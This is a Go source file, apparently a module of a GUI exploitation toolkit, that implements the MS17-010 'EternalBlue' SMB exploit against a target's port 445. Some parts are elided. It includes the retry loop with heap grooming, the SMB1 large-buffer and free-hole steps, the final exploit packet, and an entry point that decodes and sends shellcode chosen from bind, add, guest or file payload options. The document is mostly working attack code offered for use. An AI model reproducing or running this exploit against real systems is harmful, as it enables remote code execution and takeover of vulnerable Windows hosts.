...
import (
	...
	"encoding/hex"
	"fmt"
	"go-gui/pkg/register/exp_register"
	"go-gui/pkg/templates/exp_model"
	"go-gui/pkg/templates/exp_templates"
	"io"
	"io/ioutil"
	"net"
	"time"
...
func (self *Exp_MS17010) eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	// check sc size
	...
	for i := 0; i < maxAttempts; i++ {
		self.EchoInfoMsg(fmt.Sprintf("try %v...", i))
		grooms = initialGrooms + 5*i
		err = self.exploit(address, grooms, payload)
		if err == nil {
			return nil
		} else {
			self.EchoErrMsg(err.Error())
		}
	}
	return err
}

func (self *Exp_MS17010) exploit(address string, grooms int, payload []byte) error {
	// connect host
	self.EchoInfoMsg("connect host")
	...
	self.EchoInfoMsg("send SMB1 large buffer")
	...
	self.EchoInfoMsg("initialize groom threads")
	...
	// groom socket
	self.EchoInfoMsg("smb2Grooms socket")

	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return err
	}
	self.EchoInfoMsg("smb1FreeHole socket")
	...
	self.EchoInfoMsg("Running final exploit packet")
	...
	self.EchoInfoMsg(fmt.Sprintf("NT Status: 0x%08X\n", ntStatus))

	//fmt.Println("send the payload with the grooms")
	self.EchoInfoMsg("send the payload with the grooms")
...
// https://github.com/For-ACGN/MS17-010/blob/main/main.go
type Exp_MS17010 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_MS17010) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	address := self.Params.Target + ":445"
	var sc string
	switch self.GetItemSafe(self.Params.Options.CmdSubOptions, "payload") {
	case "bind":
	...
	case "file":
		read, err := ioutil.ReadFile(cmd)
		if err != nil {
			self.EchoErrMsg(fmt.Sprintf("ms17010 sc readfile %v error: %v", cmd, err.Error()))
			return
		}
	...
	if len(sc) < 20 {
		self.EchoErrMsg("no such sc")
		return
	}

	sc1, err := hex.DecodeString(sc)
	if err != nil {
		self.EchoErrMsg(self.Params.Target + " MS17-010 shellcode decode error " + err.Error())
		return
	}
	err = self.eternalBlue(address, 12, 12, sc1)
	if err != nil {
		self.EchoErrMsg(self.Params.Target + " MS17-010 exp failed " + err.Error())
		return
	}
	self.EchoInfoMsg(self.Params.Target + "\tMS17-010\texploit end")
	return
}
...
`,
		...
		CmdSubOptions: []exp_model.ExpSubOptionItem{
			{
				StaticText: "Payload: ",
				Key:        "payload",
				Value:      []string{"bind", "add", "guest", "file"},
			},
		},
	}
	...
	exp_register.ExpStructRegister(&Exp_MS17010{}, registerMsg)
